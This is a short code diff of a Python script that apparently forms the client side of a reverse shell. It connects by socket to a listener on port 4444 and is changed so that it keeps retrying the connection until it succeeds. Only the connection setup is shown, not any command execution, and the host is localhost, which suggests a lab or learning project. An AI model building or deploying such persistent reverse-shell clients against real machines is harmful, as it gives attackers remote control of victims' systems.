@@ -1,12 +1,21 @@
 import socket, os, sys, subprocess
-
+from time import sleep
 sHost = "localhost"
 sPort = 4444
 bufferSize = 1024 * 128
-separator = "<sep>"
-
+separator = " "
+isntConnected = True
 s = socket.socket()
-s.connect((sHost,sPort))
+while isntConnected:
+    try:
+        s.connect((sHost, sPort))
+        isntConnected = False
+    except:
+        continue
+    sleep(5)
+
+
+
 
 currentWorkingDirectory = os.getcwd()
 
